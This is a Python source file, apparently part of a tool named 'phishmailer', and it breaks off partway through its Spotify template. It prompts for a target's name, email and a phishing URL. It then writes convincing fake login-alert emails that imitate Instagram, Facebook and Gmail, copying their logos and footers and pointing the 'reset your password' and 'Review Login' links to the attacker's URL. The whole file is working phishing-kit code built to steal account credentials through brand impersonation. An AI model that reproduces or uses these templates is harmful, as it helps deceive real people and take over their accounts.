import os 
import sys

from Core.helper.date import monthName
from Core.helper.color import green, white, blue, start, alert, numbering, CurrentDir

def Instagram():
	Target = input(start + " Enter Target Name: ")
	TargetAccount = input(start + " Enter Target Account Name: ")
	url = input(start + " Enter Phishing Url: ")
	TargetEmail = input(start + " Enter Target Email: ")
	
	instagram = ("""
	<div dir="ltr" style="margin: 0; padding: 0;">
	<table id="m_-7319109037895721555email_table" style="border-collapse: collapse;" border="0" width="100%;" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td id="m_-7319109037895721555email_content" style="font-family: Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif; background: #ffffff;">
	<table style="border-collapse: collapse;" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="line-height: 20px;" colspan="3" height="20">&nbsp;</td>
	</tr>
	<tr>
	<td style="line-height: 1px;" colspan="3" height="1">&nbsp;</td>
	</tr>
	<tr>
	<td>
	<table style="border-collapse: collapse; border: solid 1px white; margin: 0 auto 5px auto; padding: 3px 0; text-align: center; width: 430px;" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="width: 15px;" width="15px">&nbsp;</td>
	<td style="line-height: 0px; width: 400px; padding: 0 0 15px 0;">
	<table style="border-collapse: collapse;" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="width: 100%; text-align: left; height: 33px;"><img class="CToWUd" style="border: 0;" src="https://ci5.googleusercontent.com/proxy/JecDtiZNt9PEkLjyKXOHG6GQJ4ffCEmhMipCKh2K44CFFTTQUmX11SuvnJHe12oZWnvgg-vCdZYtV8qkSIKai4k6xSrxMCMtJH43fzHt1VFA6g=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yr/r/jxR-EPx51R9.png" height="33" /></td>
	</tr>
	</tbody>
	</table>
	</td>
	<td style="width: 15px;" width="15px">&nbsp;</td>
	</tr>
	<tr>
	<td style="width: 15px;" width="15px">&nbsp;</td>
	<td style="border-top: solid 1px #c8c8c8;">&nbsp;</td>
	<td style="width: 15px;" width="15px">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td>
	<table style="border-collapse: collapse; margin: 0 auto 0 auto;" width="430" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td>
	<table style="border-collapse: collapse; margin: 0 auto 0 auto; width: 430px;" width="430px" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="display: block; width: 15px;" width="15">&nbsp;&nbsp;&nbsp;</td>
	</tr>
	<tr>
	<td>
	<table style="border-collapse: collapse;" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td>
	<table style="border-collapse: collapse;" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
	<td>
	<table style="border-collapse: collapse;" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">Hi {},</p>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">Someone tried to log in to your Instagram account {}.</p>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">If this was you, please use the following code to log in:</p>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;"><span style="font-size: xx-large;">313013</span></p>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">If this wasn't you, please <a style="color: #3b5998; text-decoration: none;" href="{}" target="_blank" rel="noopener">reset your password</a> to secure your account.</p>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	<td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td>
	<table style="border-collapse: collapse; margin: 0 auto 0 auto; width: 430px;" width="430px" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="line-height: 30px;" colspan="3" height="30">&nbsp;</td>
	</tr>
	<tr>
	<td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
	<td>
	<div style="color: #abadae; font-size: 12px; margin: 0 auto 5px auto;">&copy; Instagram, Menlo Park, CA 94022</div>
	<div style="color: #abadae; font-size: 12px; margin: 0 auto 5px auto;">This message was sent to <a style="color: #abadae; text-decoration: underline;">{}</a> and intended for {}. Not your account? <a style="color: #abadae; text-decoration: underline;" target="_blank" rel="noopener">Remove your email</a> from this account.</div>
	</td>
	<td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td style="line-height: 20px;" colspan="3" height="20">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<img class="CToWUd" style="border: 0; width: 1px; height: 1px;" src="https://ci6.googleusercontent.com/proxy/f8TdjWWQZLbPuhgu8Gz1qsup6-I9BGWATWktPEUEU4u3RYuDO6deCw2HefCgsGg7hPSe_o7aRGaEmT5eWgbbwrXbav3ivvIxslWLXecN82F4_4M8H7SteqmpOyGarWOjk28YfUHllow0QTWrPMq2HuYbfF5Q4TRWM3y3=s0-d-e1-ft#https://www.facebook.com/email_open_log_pic.php?mid=HMjU0MTE4NTg0OmFwaXpwdWRpbjk2QGdtYWlsLmNvbToxNTg3" /></td>
	</tr>
	</tbody>
	</table>
	</div>""".format(Target, TargetAccount, url, Target, TargetEmail))
	
	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(instagram)
	Html_file.close()
	print(alert + " HTML File Created")
	CurrentDir()
	
def Facebook():
	Target = input(start + " Enter Target Name: " + white)
	TargetEmail = input(start + " Enter Target Email: " + white)
	phishURL = input(start + " Enter Phishing URL: " + white)
	Date = int(input(start + " Enter a number as date: " + white))
	
	print("")
	print(start + green + "Enter Month When Login Happend")
	print(green + "[" + white + "1" + green + "]" + white + " January")
	print(green + "[" + white + "2" + green + "]" + white + " February")
	print(green + "[" + white + "3" + green + "]" + white + " March")
	print(green + "[" + white + "4" + green + "]" + white + " April")
	print(green + "[" + white + "5" + green + "]" + white + " May")
	print(green + "[" + white + "6" + green + "]" + white + " June")
	print(green + "[" + white + "7" + green + "]" + white + " July")
	print(green + "[" + white + "8" + green + "]" + white + " August")
	print(green + "[" + white + "9" + green + "]" + white + " September")
	print(green + "[" + white + "10" + green + "]" + white + " October")
	print(green + "[" + white + "11" + green + "]" + white + " November")
	print(green + "[" + white + "12" + green + "]" + white + " December")
	monthpick = int(input(green + "root@phishmailer/month:~ "))
	month = monthName(monthpick)
	
	print("")
	year = int(input(start + " Enter Year: "))
	timelog = input(start + " Enter Time (Example, 10:00 pm/am): ")
	city = input(start + " Enter name of city: ")
	country = input(start + " Enter Name of Country: ")

	facebook = ("""
	<html><head></head><body><div style="margin:0;padding:0" dir="ltr" bgcolor="#ffffff"><table cellspacing="0" cellpadding="0" width="100%;" id="m_-5140787778864602591email_table" border="0" style="border-collapse:collapse"><tbody><tr><td id="m_-5140787778864602591email_content" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;background:#ffffff"><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td height="20" style="line-height:20px" colspan="3">&nbsp;</td></tr><tr><td height="1" colspan="3" style="line-height:1px"><span style="color:#ffffff;display:none!important;font-size:1px"></span></td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td height="16" style="line-height:16px" colspan="3">&nbsp;</td></tr><tr><td width="32" align="left" valign="middle" style="height:32;line-height:0px"><a style="color:#3b5998;text-decoration:none" target="_blank"><img src="https://ci6.googleusercontent.com/proxy/EtxfQKU-LSNk3Cs2UEF2iTtMjX4XBhsW4wkC-6_XBZV22W3eB-S2JrRw027OocPIFPltHMAtxKA8QWOzc47CUrqu5jLKr9lWj_dvd8Dd1TZEpA=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/_2faPUZhPI6.png" width="32" height="32" style="border:0" class="CToWUd"></a></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td width="100%"><a style="color:#3b5998;text-decoration:none;font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:19px;line-height:32px" target="_blank" >Login Alert</a></td></tr><tr style="border-bottom:solid 1px #e5e5e5"><td height="16" style="line-height:16px" colspan="3">&nbsp;</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td height="28" style="line-height:28px">&nbsp;</td></tr><tr><td><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;font-weight:bold;color:#141823">Hi {},</span></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823">Your account was recently logged into from an unrecognized browser or device. Was this you?</span></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><span style="font-size:10px;font-weight:bold;color:#777">New Login</span></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td></td></tr><tr style="border-top:solid 1px #e5e5e5"><td height="0" style="line-height:0px">&nbsp;</td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><table cellspacing="0" cellpadding="0" width="100%" align="left" class="m_-5140787778864602591ib_t" style="border-collapse:collapse;min-width:420px"><tbody><tr class="m_-5140787778864602591ib_row"><td valign="top" style="padding-right:10px;font-size:0px" class="m_-5140787778864602591ib_img"><img src="https://ci6.googleusercontent.com/proxy/DCTANTsJ1OvRNB6zZT48v37sH3JcbGz_I6HAHayvNwCn1Rob8r9MiKJ1BR-r5XeHt81lkel1D5_MiAsHRpqRfDmyzTkj2HyqQGpas_2qBbC-jg=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/OUnczqecsPd.png" width="16px" height="16px" style="border:0" class="CToWUd"></td><td width="100%" valign="top" style="padding-right:10px" class="m_-5140787778864602591ib_mid"><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823"> {} {}, {} at {}</span></td></tr></tbody></table></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td></td></tr><tr style="border-top:solid 1px #e5e5e5"><td height="0" style="line-height:0px">&nbsp;</td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><table cellspacing="0" cellpadding="0" width="100%" align="left" class="m_-5140787778864602591ib_t" style="border-collapse:collapse;min-width:420px"><tbody><tr class="m_-5140787778864602591ib_row"><td valign="top" style="padding-right:10px;font-size:0px" class="m_-5140787778864602591ib_img"><img src="https://ci5.googleusercontent.com/proxy/QBDrjhzwIX48mu2IPh7LHsNkIiAd7lRdk76BILhcwZS9DS_KAimbh1JSh1MNokIqcjZNHvhX8is9-3t0O_8_RCsPfHnvT2X0TDGT7hbhPQOxng=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/HLjP6-RaBz8.png" width="16px" height="16px" style="border:0" class="CToWUd"></td><td width="100%" valign="top" style="padding-right:10px" class="m_-5140787778864602591ib_mid"><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823">Near {}, {}</span></td></tr></tbody></table></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td></td></tr><tr style="border-top:solid 1px #e5e5e5"><td height="0" style="line-height:0px">&nbsp;</td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><table cellspacing="0" cellpadding="0" width="100%" align="left" class="m_-5140787778864602591ib_t" style="border-collapse:collapse;min-width:420px"><tbody><tr class="m_-5140787778864602591ib_row"><td valign="top" style="padding-right:10px;font-size:0px" class="m_-5140787778864602591ib_img"><img src="https://ci3.googleusercontent.com/proxy/6eUh9zO42iKU02o2lX-pLc3uDyVFjkGqvjU7jnDgBNwGngV7cFiIa3DPoWtXpkyXqhygmeah586FIXGGQYGa6bw_Y9xD7ltzGQwaFLbzznqHzA=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yH/r/FOZusRNk18E.png" width="16px" height="16px" style="border:0" class="CToWUd"></td><td width="100%" valign="top" style="padding-right:10px" class="m_-5140787778864602591ib_mid"><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823">Google Chrome</span></td></tr></tbody></table></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td height="2" style="line-height:2px" colspan="3">&nbsp;</td></tr><tr><td class="m_-5140787778864602591mb_blk"><a href="{}" style="color:#3b5998;text-decoration:none" target="_blank"><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td style="border-collapse:collapse;border-radius:2px;text-align:center;display:block;border:solid 1px #344c80;background:#4c649b;padding:7px 16px 11px 16px"><a href="{}" style="color:#3b5998;text-decoration:none;display:block" target="_blank"><center><font size="3"><span style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;white-space:nowrap;font-weight:bold;vertical-align:middle;color:#ffffff;font-size:14px;line-height:14px">Review&nbsp;Login</span></font></center></a></td></tr></tbody></table></a></td><td width="10" style="display:block;width:10px" class="m_-5140787778864602591mb_hide">&nbsp;&nbsp;&nbsp;</td><td class="m_-5140787778864602591mb_blk"><a href="{}" style="color:#3b5998;text-decoration:none" target="_blank"><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td style="border-collapse:collapse;border-radius:2px;text-align:center;display:block;border:solid 1px #c9ccd1;background:#f6f7f8;padding:7px 16px 11px 16px"><a href="{}" style="color:#3b5998;text-decoration:none;display:block" target="_blank"><center><font size="3"><span style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;white-space:nowrap;font-weight:bold;vertical-align:middle;color:#525252;font-size:14px;line-height:14px">Manage&nbsp;Alerts</span></font></center></a></td></tr></tbody></table></a></td><td width="100%" class="m_-5140787778864602591mb_hide"></td></tr><tr><td height="32" style="line-height:32px" colspan="3">&nbsp;</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr style="border-top:solid 1px #e5e5e5"><td height="16" style="line-height:16px">&nbsp;</td></tr><tr><td style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:11px;color:#aaaaaa;line-height:16px">This message was sent to <a href="" style="color:#3b5998;text-decoration:none" target="_blank">{}/a>. If you don't want to receive these emails from Facebook in the future, please <a href="" style="color:#3b5998;text-decoration:none" target="_blank" data-saferedirecturl="#link11">unsubscribe</a>.<br>Facebook, Inc., Attention: Community Support, 1 Hacker Way, Menlo Park, CA 94025</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td height="20" style="line-height:20px" colspan="3">&nbsp;</td></tr></tbody></table><span><img src="https://ci5.googleusercontent.com/proxy/HW2B-_UGsdk69Jyhg1T6TPoP85hYe1BMFUnXG1tzXLvolAUwH6t0YiIo4qp5aCDfKneX2WoPW8rAE0T34kLDIX0mSXZNOiQuEaPUHdAvImAazBZauNI1_PSndHlRvKy951jvWI5bsvfOh2oBJC7IqpAoyZXzYQ=s0-d-e1-ft#https://www.facebook.com/email_open_log_pic.php?mid=5464d188693c7G5af398d232efG5464d621c9699G2bf" style="border:0;width:1px;height:1px" class="CToWUd"></span></td></tr></tbody></table></div></div></div> </div></div></div></div></div></div></div></div></body></html>
	""".format(Target, month, Date, year, timelog, city, country,phishURL, phishURL, phishURL, phishURL, TargetEmail))
	
	print("")
	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(facebook)
	Html_file.close()
	print(alert + " HTML File Created")
	
def Gmail():
	Target = input(start + " Enter Target Name: " + white)
	TargetEmail = input(start + " Enter Target Email: " + white)
	Day = input(start + " Enter Day ex.Monday: " + white)
	Date = input(start + " Enter Date: " + white)
	Year = input(start + " Enter Year: " + white)
	Time = input(start + " Enter Time (Example, 10:00 pm/am): " + white)
	
	print("")
	print(start + "Enter Month When Login Happend")
	print(numbering(1) + white + " January")
	print(numbering(2) + white + " February")
	print(numbering(3) + white + " March")
	print(numbering(4) + white + " April")
	print(numbering(5) + white + " May")
	print(numbering(6) + white + " June")
	print(numbering(7) + white + " July")
	print(numbering(8) + white + " August")
	print(numbering(9) + white + " September")
	print(numbering(10) + white + " October")
	print(numbering(11) + white + " November")
	print(numbering(12) + white + " December")
	monthpick = int(input(green + "root@phishmailer:~ " + white))
	
	print("")
	Country = input(start + " Enter Country: " + white)
	City = input(start + " Enter A City: " + white)
	PhishUrl = input(start + " Enter A Phishing Url: " + white)
	month = monthName(monthpick)

	Gmail = ("""<table style="min-width: 348px; width: 100%; height: 100%;" border="0" cellspacing="0" cellpadding="0">
	<tbody>
	<tr align="center">
	<td width="32px">&nbsp;</td>
	<td>
	<table style="max-width: 600px;" border="0" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td>
	<table style="width: 100%;" border="0" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td align="left"><img class="CToWUd" style="display: block; width: 92px; height: 32px;" src="https://ci3.googleusercontent.com/proxy/EURRrDHt1LcCbHcRdDtMHOQPPMHe5FkDsMAHs66gxAIYzYD38Abpa1Fmy-ACuq2V1tI8GZdWA4FLsXjKM4iAD-CixwUocANswARkdK1ttXK-T1DDSfiUplKFys37dkM=s0-d-e1-ft#https://www.gstatic.com/accountalerts/email/googlelogo_color_188x64dp.png" alt="" width="92" height="32" /></td>
	<td align="right"><img class="CToWUd" style="display: block; width: 32px; height: 32px;" src="https://ci6.googleusercontent.com/proxy/w8ACgsIEmhjGKodu731Z-VOiYfmXsRM4zd6F_w4_cKQ1JPXF_6Y_hEPR_iJKee33yGZ8zR6o_Q08vuYMKmetfyoGNtMpt1d5CU6z3xA=s0-d-e1-ft#https://www.gstatic.com/accountalerts/email/keyhole.png" alt="" width="32" height="32" /></td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td>
	<table style="min-width: 332px; max-width: 600px; border-width: 1px 1px 0px; border-image: initial; border-top-left-radius: 3px; border-top-right-radius: 3px; width: 100%; border-color: #e0e0e0 #e0e0e0 initial #e0e0e0; border-style: solid solid initial solid;" border="0" cellspacing="0" cellpadding="0" bgcolor="#4184F3">
	<tbody>
	<tr>
	<td colspan="3" height="72px">&nbsp;</td>
	</tr>
	<tr>
	<td width="32px">&nbsp;</td>
	<td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 24px; color: #ffffff; line-height: 1.25;">New <span class="il">sign</span>-in from Chrome on Windows</td>
	<td width="32px">&nbsp;</td>
	</tr>
	<tr>
	<td colspan="3" height="18px">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td>
	<table style="min-width: 332px; max-width: 600px; border-width: 0px 1px 1px; border-image: initial; border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; width: 100%; border-color: initial #f0f0f0 #c0c0c0 #f0f0f0; border-style: initial solid solid solid;" border="0" cellspacing="0" cellpadding="0" bgcolor="#FAFAFA">
	<tbody>
	<tr>
	<td rowspan="3" width="32px">&nbsp;</td>
	<td>&nbsp;</td>
	<td rowspan="3" width="32px">&nbsp;</td>
	</tr>
	<tr>
	<td>
	<table style="min-width: 300px;" border="0" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #202120; line-height: 1.5;">Hi {},</td>
	</tr>
	<tr>
	<td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #202120; line-height: 1.5;">Your Google Account <a>{}</a> was just used to <span class="il">sign</span> in from <span style="white-space: nowrap;">Chrome</span> on <span style="white-space: nowrap;">Windows</span>.
	<table style="margin-top: 48px; margin-bottom: 48px;" border="0" cellspacing="0" cellpadding="0">
	<tbody>
	<tr valign="middle">
	<td width="32px">&nbsp;</td>
	<td align="center"><img class="CToWUd" style="width: 48px; height: 48px; display: block; border-radius: 50%;" src="https://lh3.googleusercontent.com/-bQZ5NhEHURU/WL5aUNfXA1I/AAAAAAAAAA4/gTy3xQfIhFEyPcxScplho8gYxNp1xC3lwCEw/w140-h140-p/34AD2.jpg" alt="" width="48px" height="48px" /></td>
	<td width="16px">&nbsp;</td>
	<td style="line-height: 1.2;"><span style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 20px; color: #202120;">{}</span><br /><span style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #727272;"><a>{}</a></span></td>
	</tr>
	<tr valign="middle">
	<td width="32px" height="24px">&nbsp;</td>
	<td align="center" height="24px"><img class="CToWUd" style="width: 4px; height: 10px; display: block;" src="https://ci4.googleusercontent.com/proxy/3v5djkrQw0eYYuEXwiOUoxXYc3R6bFSVEFNL0C3YbDgAYCp7sUIL4fxyDZ8RADuKX3gZ4_z6bAmrACIqNYpHa95AfUrSskjfkEf4nDXRH7A=s0-d-e1-ft#https://www.gstatic.com/accountalerts/email/down_arrow.png" alt="" width="4px" height="10px" /></td>
	</tr>
	<tr valign="top">
	<td width="32px">&nbsp;</td>
	<td align="center"><img class="CToWUd" style="width: 48px; height: 48px; display: block;" src="https://ci6.googleusercontent.com/proxy/8-TvqI07V6c6EfMmOpioytN1akb1_MYoQR5JjP9FrOcBKg-A1ob9_8rI-og2hhemR-SKt-PTzEc8LHrxdtQOnK5WmXqFWq16_l4IuCD9uPzGQipSyU_VqCQpBegNZjcIuYnKtg=s0-d-e1-ft#https://www.gstatic.com/accountalerts/devices/windows_laptop_wallpaper_big.png" alt="" width="48px" height="48px" /></td>
	<td width="16px">&nbsp;</td>
	<td style="line-height: 1.2;"><span style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 16px; color: #202120;">Windows</span><br /><span style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #727272;">{}, {} {}, {} {}<br /> {}, {}<br />Chrome</span></td>
	</tr>
	</tbody>
	</table>
	<strong>Don't recognize this activity?</strong><br />Review your <a style="text-decoration: none; color: #4285f4;" href="{}" target="_blank" rel="noopener">recently used devices</a> now.<br /><br />Why are we sending this? We take security very seriously and we want to keep you in the loop on important actions in your account.<br />We were unable to determine whether you have used this browser or device with your account before. This can happen when you <span class="il">sign</span> in for the first time on a new computer, phone or browser, when you use your browser's incognito or private browsing mode or clear your cookies, or when somebody else is accessing your account.</td>
	</tr>
	<tr>
	<td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #202120; line-height: 1.5;">Best,<br />The Google Accounts team</td>
	</tr>
	<tr>
	<td>
	<table style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 12px; color: #b9b9b9; line-height: 1.5;">
	<tbody>
	<tr>
	<td>*The location is approximate and determined by the IP address it was coming from.</td>
	</tr>
	<tr>
	<td>This email can't receive replies. To give us feedback on this alert, <a style="text-decoration: none; color: #4285f4;" href="{}" target="_blank" rel="noopener">click here</a>.<br />For more information, visit the <a style="text-decoration: none; color: #4285f4;" href="{}" target="_blank" rel="noopener">Google Accounts Help Center</a>.</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td style="max-width: 600px; font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 10px; color: #bcbcbc; line-height: 1.5;">&nbsp;</td>
	</tr>
	<tr>
	<td>
	<table style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 10px; color: #666666; line-height: 18px; padding-bottom: 10px;">
	<tbody>
	<tr>
	<td>You received this mandatory email service announcement to update you about important changes to your Google product or account.</td>
	</tr>
	<tr>
	<td>
	<div style="direction: ltr; text-align: left;">&copy; {} Google Inc., 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</div>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	<td width="32px">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<p><br /><br /></p>""".format(Target, TargetEmail, Target, TargetEmail, Day, month, Date, Year, Time, City, Country, PhishUrl, PhishUrl, PhishUrl, Year))
	
	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(Gmail)
	Html_file.close()
	print(alert + " HTML File Created")

	
def Spotify():
	Url = input(start + " Enter Your PhishingUrl: ")
	Email = input(start + " Enter Target Email: ")
	Country = input(start + " Enter Country: ")
	City = input(start + " Enter City: ")
	Date = input(start + " Enter Date: ")
	
	print("")
	print(start + " Enter Month When Login Happend")
	print(green + "[" + white + "1" + green + "]" + white + " January")
	print(green + "[" + white + "2" + green + "]" + white + " February")
	print(green + "[" + white + "3" + green + "]" + white + " March")
	print(green + "[" + white + "4" + green + "]" + white + " April")
	print(green + "[" + white + "5" + green + "]" + white + " May")
	print(green + "[" + white + "6" + green + "]" + white + " June")
	print(green + "[" + white + "7" + green + "]" + white + " July")
	print(green + "[" + white + "8" + green + "]" + white + " August")
	print(green + "[" + white + "9" + green + "]" + white + " September")
	print(green + "[" + white + "10" + green + "]" + white + " October")
	print(green + "[" + white + "11" + green + "]" + white + " November")
	print(green + "[" + white + "12" + green + "]" + white + " December")
	print("")
	monthpick = int(input(green + "root@phishmailer/month:~ " + white))
	month = monthName(monthpick)
	
	print("")
	Time = input(start + " Enter Time (example 11:45:17): ")
	
	source = ("""
	<div style="width: 100%!important; margin: 0; padding: 0;">
	<table style="width: 100%; max-width: 480px;" border="0" width="100%" cellspacing="0" cellpadding="0" align="center">
	<tbody>
	<tr>
	<td style="word-break: normal; border-collapse: collapse; font-family: 'Circular','Helvetica Neue',Helvetica,Arial,sans-serif; font-size: 12px; line-height: 18px; color: #555555;" align="left" valign="top"><center>
	<div>
	<table style="border: none; margin: 0px; border-collapse: collapse; padding: 0px; width: 100%; height: 50px;" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<tr style="border: none; margin: 0px; padding: 0px; height: 20px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 20px;" colspan="3" valign="middle" height="20">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px;" valign="middle"><a style="border: none; margin: 0px; padding: 0px; text-decoration: none;" href="{}" target="_blank" rel="noopener"><img style="border: none; margin: 0px; padding: 0px; display: block; max-width: 100%; width: 122px; height: 37px;" src="https://message-editor.scdn.co/newsletters/b220713a2d4ac7a75ebe1f9ee0c78549.png" alt="" width="122" height="37" /></a></td>
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px; height: 20px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 20px;" colspan="3" valign="middle" height="20">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<table dir="ltr" style="border: none; margin: 0px; border-collapse: collapse; padding: 0px; width: 100%;" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<tr style="border: none; margin: 0px; padding: 0px; height: 28px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 28px;" colspan="3" valign="middle" height="28">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<h1 style="border: none; margin: 0px; padding: 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; text-decoration: none; color: #000000; font-size: 40px; font-weight: bold; line-height: 45px; letter-spacing: -0.04em; text-align: center;" align="center">New login on Spotify</h1>
